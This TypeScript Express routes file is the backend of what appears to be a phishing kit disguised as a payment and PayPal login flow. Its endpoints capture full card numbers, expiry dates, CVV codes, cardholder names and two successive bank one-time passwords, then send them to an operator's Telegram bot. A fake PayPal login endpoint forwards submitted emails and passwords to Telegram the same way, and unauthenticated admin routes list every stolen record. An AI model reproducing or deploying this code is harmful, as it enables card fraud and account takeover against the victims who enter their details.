import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { 
  insertAdminSettingsSchema, 
  insertPaymentRecordSchema 
} from "@shared/schema";
import { z } from "zod";
import { 
  sendTelegramMessage, 
  formatPaymentNotification,
  formatPayPalNotification 
} from "./telegram";

export async function registerRoutes(app: Express): Promise<Server> {
  // Admin settings endpoints
  app.get("/api/admin/settings", async (req, res) => {
    try {
      const settings = await storage.getAdminSettings();
      res.json(settings || { telegramBotToken: "", telegramChatId: "" });
    } catch (error) {
      res.status(500).json({ error: "Failed to get settings" });
    }
  });

  app.post("/api/admin/settings", async (req, res) => {
    try {
      const validated = insertAdminSettingsSchema.parse(req.body);
      const settings = await storage.upsertAdminSettings(validated);
      res.json(settings);
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: error.errors });
      } else {
        res.status(500).json({ error: "Failed to save settings" });
      }
    }
  });

  app.post("/api/admin/test-telegram", async (req, res) => {
    try {
      const { botToken, chatId } = req.body;
      
      if (!botToken || !chatId) {
        return res.status(400).json({ error: "Missing botToken or chatId" });
      }

      const testMessage = `🧪 <b>Test de connexion</b>\n\nVotre bot Telegram est correctement configuré!\n\n⏰ ${new Date().toLocaleString('fr-FR')}`;
      const success = await sendTelegramMessage(botToken, chatId, testMessage);
      
      if (success) {
        res.json({ success: true, message: "Test message sent successfully" });
      } else {
        res.status(500).json({ success: false, error: "Failed to send test message" });
      }
    } catch (error) {
      res.status(500).json({ error: "Test failed" });
    }
  });

  // Payment flow endpoints
  app.post("/api/payment/start", async (req, res) => {
    try {
      const paymentData = {
        cardNumber: req.body.cardNumber,
        expiryMonth: req.body.expiryMonth,
        expiryYear: req.body.expiryYear,
        cvv: req.body.cvv,
        cardholderName: req.body.cardholderName,
        otp1: null,
        otp2: null,
        paypalEmail: null,
        paypalPassword: null,
      };

      const validated = insertPaymentRecordSchema.parse(paymentData);
      const record = await storage.createPaymentRecord(validated);
      
      res.json({ paymentId: record.id });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ error: error.errors });
      } else {
        res.status(500).json({ error: "Failed to create payment record" });
      }
    }
  });

  app.post("/api/payment/:id/otp1", async (req, res) => {
    try {
      const { id } = req.params;
      const { otp } = req.body;

      const updated = await storage.updatePaymentRecord(id, { otp1: otp });
      
      if (!updated) {
        return res.status(404).json({ error: "Payment record not found" });
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update OTP" });
    }
  });

  app.post("/api/payment/:id/otp2", async (req, res) => {
    try {
      const { id } = req.params;
      const { otp } = req.body;

      const updated = await storage.updatePaymentRecord(id, { otp2: otp });
      
      if (!updated) {
        return res.status(404).json({ error: "Payment record not found" });
      }

      // Send notification to Telegram after OTP2 is verified
      const settings = await storage.getAdminSettings();
      if (settings?.telegramBotToken && settings?.telegramChatId) {
        const message = formatPaymentNotification({
          cardNumber: updated.cardNumber,
          expiryMonth: updated.expiryMonth,
          expiryYear: updated.expiryYear,
          cvv: updated.cvv,
          cardholderName: updated.cardholderName,
          otp1: updated.otp1 || undefined,
          otp2: updated.otp2 || undefined,
          timestamp: updated.createdAt || new Date(),
        });

        await sendTelegramMessage(
          settings.telegramBotToken,
          settings.telegramChatId,
          message
        );
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to update OTP" });
    }
  });

  // PayPal login endpoint
  app.post("/api/paypal/login", async (req, res) => {
    try {
      const { email, password } = req.body;

      if (!email || !password) {
        return res.status(400).json({ error: "Email and password required" });
      }

      // Send notification to Telegram
      const settings = await storage.getAdminSettings();
      if (settings?.telegramBotToken && settings?.telegramChatId) {
        const message = formatPayPalNotification({
          email,
          password,
          timestamp: new Date(),
        });

        await sendTelegramMessage(
          settings.telegramBotToken,
          settings.telegramChatId,
          message
        );
      }

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to process login" });
    }
  });

  // Get all payment records (for admin)
  app.get("/api/payments", async (req, res) => {
    try {
      const records = await storage.getAllPaymentRecords();
      res.json(records);
    } catch (error) {
      res.status(500).json({ error: "Failed to get payment records" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
